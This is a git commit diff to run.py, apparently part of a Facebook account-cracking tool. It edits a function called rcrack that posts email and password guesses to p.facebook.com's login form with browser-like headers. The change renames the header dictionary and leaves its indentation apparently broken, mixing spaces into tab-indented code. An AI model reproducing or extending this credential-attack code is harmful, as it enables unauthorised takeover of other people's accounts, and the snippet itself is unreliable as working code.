905ef6da92588f1a744aa22c1077d2e744b76fd6
BLAZE-XD <156874822+raazuhero@users.noreply.github.com>
2024-03-23 02:29:16 +0000

    Update run.py

--- run.py
+++ run.py
@@ -1210,7 +1210,8 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {		
+				
+    headers = {
     'authority': 'p.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
